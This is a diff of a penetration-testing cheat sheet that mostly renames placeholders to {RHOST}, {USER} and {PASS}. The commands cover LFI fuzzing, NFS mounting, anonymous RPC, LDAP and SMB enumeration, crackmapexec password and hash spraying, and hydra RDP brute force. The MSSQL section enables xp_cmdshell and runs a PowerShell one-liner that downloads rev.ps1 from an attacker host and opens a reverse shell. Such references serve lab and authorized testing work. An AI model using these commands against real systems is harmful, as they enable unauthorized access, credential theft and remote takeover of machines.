@@ -300,13 +300,9 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medi
 
 # Notes: Not recursive, only digs one level deep
 
-################################################################################################################################################
-
 # Local File Inclusion FUZZ
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt "http://{RHOST}/browse.php?p=source&file={FUZZ}"
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt "http://{RHOST}/browse.php?p=source&file={FUZZ}"
-
-#################################################################################################################################################
 
 # Brute Force Web Fields
 # Usage - One variable FUZZ
@@ -346,12 +342,8 @@ medusa -f -h {RHOST} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http -m DI
 <br />
 
 ```bash
-# telnet
-# About: Used to connect to POP email
-# Download: Pre-installed on Kali Linux
-
-# Usage
-telnet {IP ADDRESS} 110
+# Telnet Connect
+telnet {RHOST} 110
 
 # Input User
 USER {Mail Username}
@@ -375,7 +367,7 @@ RETR {List #}
 ```bash
 
 # RPC info
-nmap -sV -p 111 --script=rpcinfo {IP ADDRESS}
+nmap -sV -p 111 --script=rpcinfo {RHOST}
 
 # List NFS vuln
  ls -1 /usr/share/nmap/scripts/nfs*
@@ -385,10 +377,10 @@ nmap -sV -p 111 --script=rpcinfo {IP ADDRESS}
 /usr/share/nmap/scripts/nfs-statfs.nse
 
 # Run all vuln scripts
-nmap -p 111 --script nfs* {IP ADDRESS}
+nmap -p 111 --script nfs* {RHOST}
 
 # Mount remote directory
-sudo mount -o nolock {IP ADDRESS}:/{REMOTE DIR} ~/{LOCAL DIR}/
+sudo mount -o nolock {RHOST}:/{REMOTE DIR} ~/{LOCAL DIR}/
 
 # Add new user locally and change UUID
 sudo adduser pwn
@@ -406,9 +398,8 @@ https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 
 ```bash
 # Enumerate RPC client 
-rpcclient -U "" -N {IP ADDRESS}
-rpcclient -U '{USERNAME}'%'{PASSWORD}' {IP ADDRESS}
-
+rpcclient -U "" -N {RHOST}
+rpcclient -U '{USER}'%'{PASS}' {RHOST}
 # Get information about objects such as groups or users
 enumdomusers
 enumdomains
@@ -426,7 +417,7 @@ srvinfo
 getdompwinfo
 
 # Change user password
-setuserinfo2 {USERNAME} 23 '{PASSWORD}'
+setuserinfo2 {USER} 23 '{PASS}'
 
 # Try to enumerate different trusted domains
 dsr_enumtrustdom
@@ -452,22 +443,22 @@ lookupsids SID
 
 ```bash
 # Scan SNMP Port
-sudo nmap -sU --open -p 161 {IP ADDRESS} -oG open-snmp.txt
+sudo nmap -sU --open -p 161 {RHOST} -oG open-snmp.txt
 
 # Enumerate MIB Tree
-snmpwalk -c public -v1 -t 10 {IP ADDRESS}
+snmpwalk -c public -v1 -t 10 {RHOST}
 
 # Enumerate Windows Users
-snmpwalk -c public -v1 {IP ADDRESS} 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 {RHOST} 1.3.6.1.4.1.77.1.2.25
 
 # Enumerate Running Windows Processes
-snmpwalk -c public -v1 {IP ADDRESS} 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 {RHOST} 1.3.6.1.2.1.25.4.2.1.2
 
 # Enumerate Open TCP ports
-snmpwalk -c public -v1 {IP ADDRESS} 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 {RHOST} 1.3.6.1.2.1.6.13.1.3
 
 # Enumerate Installed Software
-snmpwalk -c public -v1 {IP ADDRESS} 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v1 {RHOST} 1.3.6.1.2.1.25.6.3.1.2
 ```
 
 
@@ -478,79 +469,76 @@ snmpwalk -c public -v1 {IP ADDRESS} 1.3.6.1.2.1.25.6.3.1.2
 ```bash
 
 # Enumforlinux
-enum4linux -U {IP ADDRESS}
+enum4linux -U {RHOST}
 
 # ldap search for DC name
-ldapsearch -H ldap://{IP ADDRESS} -x -s base 
+ldapsearch -H ldap://{RHOST} -x -s base 
 
 # ldap DC enumeration
-ldapsearch -H ldap://{IP ADDRESS} -x -b "{DC NAMING CONTEXT}"
+ldapsearch -H ldap://{RHOST} -x -b "{DC NAMING CONTEXT}"
 
 # ldap DC people dump
-ldapsearch -H ldap://{IP ADDRESS} -x -b "{DC NAMING CONTEXT}" '(objectClass=Person)'
-ldapsearch -H ldap://{IP ADDRESS} -x -b "{DC NAMING CONTEXT}" '(objectClass=User)'
+ldapsearch -H ldap://{RHOST} -x -b "{DC NAMING CONTEXT}" '(objectClass=Person)'
+ldapsearch -H ldap://{RHOST} -x -b "{DC NAMING CONTEXT}" '(objectClass=User)'
 
 # ldap account name list
-ldapsearch -H ldap://{IP ADDRESS} -x -b "{DC NAMING CONTEXT}" '(objectClass=Person)' sAMAccountName |grep sAMAccountName | awk '{print $2}'
+ldapsearch -H ldap://{RHOST} -x -b "{DC NAMING CONTEXT}" '(objectClass=Person)' sAMAccountName |grep sAMAccountName | awk '{print $2}'
 
 # Authentication Flags
--D {USER}@{DOMAIN} -w {PASSWORD}
+-D {USER}@{DOMAIN} -w {PASS}
 ```
 
 ## SMB [445]
 
 ```bash
-# SMBCLIENT
-# About: Used to connect to SMB 
-# Download: Pre-installed on Kali Linux
-
 # Detect Share Permissions
-smbmap -H {IP ADDRESS}  
+smbmap -H {RHOST}  
 
-# smbmap authentication
-smbmap -u '' -p '' -H {IP ADDRESS}  
+# Detect Share Permissions authenticated
+smbmap -u '' -p '' -H {RHOST}  
 
 # Recursively show all readable files and shares
-smbmap -R {SHARE} -H {IP ADDRESS} --depth 10
+smbmap -R {SHARE} -H {RHOST} --depth 10
 
 # Download a file with smbmap
-smbmap -R {SHARE} -H {IP ADDRESS} -A {FILE} -q 
+smbmap -R {SHARE} -H {RHOST} -A {FILE} -q 
 
 # List all SMB Shares
-smbclient -L {IP ADDRESS}
+smbclient -L {RHOST}
 
 # Authenticate with local credentials
-smbclient -N \\\\{IP ADDRESS}\\{SHARE} 
-
-# Authenticate with user/password 
-smbclient \\\\{IP ADDRESS}\\{SHARE} -U {USERNAME}%{PASSWORD}
-
-# Recursively show sub directories of share
-smbclient \\\\{IP ADDRESS}\\{SHARE} -c 'recurse;ls'
-
-# Check Drive Permissions
-smbcacls -N '//{IP ADDRESS}/{SHARE}' {SUBFOLDER} 
-
-# Brute force SMB user and password list
-crackmapexec smb {IP ADDRESS} -u {USER.txt} -p {PASSWORDS.txt} --shares --continue-on-success
-
-# Null authentication - password policy
-crackmapexec smb {IP ADDRESS} --pass-pol
-crackmapexec smb {IP ADDRESS} --pass-pol -u '' -p ''
-
-# Winrm credential check
-crackmapexec winrm {IP ADDRESS} -u '{USER}' -p '{PASSWORD}'
-
-# Mount SMB Drive
-sudo mount -t cifs //{IP ADDRESS}/{SHARE} /mnt/{SHARE}/
-sudo mount -t cifs -o 'username={USERNAME},password={PASSWORD}' //{IP ADDRESS}/{SHARE} /mnt/{SHARE}/
-sudo umount {SHARE}
+smbclient -N \\\\{RHOST}\\{SHARE} 
 
 # Get all files
 mask ""
 recurse ON
 prompt OFF
 mget *
+
+# Authenticate with user/password 
+smbclient \\\\{RHOST}\\{SHARE} -U {USER}%{PASS}
+
+# Recursively show sub directories of share
+smbclient \\\\{RHOST}\\{SHARE} -c 'recurse;ls'
+
+# Check Drive Permissions
+smbcacls -N '//{RHOST}/{SHARE}' {SUBFOLDER} 
+
+# Brute force SMB user and password/hash list
+crackmapexec smb {RHOST} -u {user.txt} -p {pass.txt} --shares --continue-on-success
+crackmapexec smb {RHOST} -u {user.txt} -H {hash.txt} --shares --continue-on-success
+
+# Check password policy
+crackmapexec smb {RHOST} --pass-pol
+crackmapexec smb {RHOST} --pass-pol -u '' -p ''
+
+# Winrm credential check
+crackmapexec winrm {RHOST} -u '{USER}' -p '{PASS}'
+
+# Mount SMB Drive
+sudo mount -t cifs //{RHOST}/{SHARE} /mnt/{SHARE}/
+sudo mount -t cifs -o 'username={USER},password={PASS}' //{RHOST}/{SHARE} /mnt/{SHARE}/
+sudo umount {SHARE}
 
 # List Vuln Scripts
 ls -1 /usr/share/nmap/scripts/smb*
@@ -570,13 +558,8 @@ ls -1 /usr/share/nmap/scripts/smb*
 /usr/share/nmap/scripts/smb-os-discovery.nse
 
 # Example Vuln script
-nmap -v -p 139, 445 --script=smb-os-discovery {IP ADDRESS}
+nmap -v -p 139, 445 --script=smb-os-discovery {RHOST}
 
-
-# {IP ADDRESS}:   IP Address of the Server
-# {SHARE}:        Share name to connect
-# {USER.txt}:     User list to be brute forced
-# {PASSWORD.txt}: Password list to be brute forced
 ```
 <br />
 
@@ -587,20 +570,13 @@ nmap -v -p 139, 445 --script=smb-os-discovery {IP ADDRESS}
 [https://www.tutorialspoint.com/sql/sql-select-database.htm](https://www.tutorialspoint.com/sql/sql-select-database.htm)
 
 ```bash
-
-
-# Impacket-mssqlclient
-impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} 
-impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} -windows-auth
+# MSSQL Remote Connect 
+impacket-mssqlclient {USER}:'{PASS}'@{RHOST} 
+impacket-mssqlclient {USER}:'{PASS}'@{RHOST} -windows-auth
 
 # Enable Code Execution
 SQL> enable_xp_cmdshell
 SQL> EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://{LHOST}/rev.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT} | powershell -noprofile'
-
-# Note: Requires credentials
-# {IP ADDRESS}: IP Address of the Server
-# {USERNAME}:   User Authentication
-# {PASSWORD}:   Password Authentication
 
 # SQL SHELL
 sql> help
@@ -629,7 +605,6 @@ sql> xp_dirtree "\\{IP ADDRESS}\test"
 
 <br />
 
-
 ```bash
 # Remote Connect Password or Hash
 xfreerdp /u:{USER} /p:'{PASS}' /cert:ignore /v:{RHOST} /dynamic-resolution
@@ -646,11 +621,7 @@ hydra -f -t 16 -L {user.txt} -P {pass.txt} rdp://{RHOST}
 <br />
 
 ```bash
-# EVIL WINRM
-# About: A tool used to hack WINRM from a linux console
-# Download: Pre-installed on Kali Linux
-
-# Usage
+# Remote Connect
 evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
 
 # Upload/Download a File from client => server in current directory
